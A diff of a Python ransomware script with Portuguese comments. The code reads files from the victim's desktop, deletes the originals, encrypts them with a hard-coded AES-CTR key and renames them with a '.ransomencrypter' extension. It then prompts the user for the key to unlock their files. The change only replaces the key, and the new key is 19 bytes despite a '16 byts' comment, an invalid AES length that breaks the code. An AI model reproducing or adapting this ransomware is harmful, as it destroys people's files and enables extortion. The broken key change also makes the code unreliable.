@@ -38,7 +38,7 @@ def criptografando():
             data_arqui = A.read()
             A.close()
             os.remove(f'{desktop}\\{format_arqui}')
-            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
+            key = b"1cb5c7o1n3j9h7i2jj8"  # 16 byts key - chave
             aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
             crypto_data = aes.encrypt(data_arqui)
             novo_arqui = format_arqui + ".ransomencrypter"
@@ -71,7 +71,7 @@ if __name__ == '__main__':
     criptografando()
     if criptografando:
         key = input('Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:')
-        if key == '1ab2c3e4f5g6h7i8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
+        if key == '1cb5c7o1n3j9h7i2jj8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
             descrypt(key)
             for del_file in glob.glob('*.ransomencrypter'):
                 os.remove(f'{desktop}\\{del_file}')
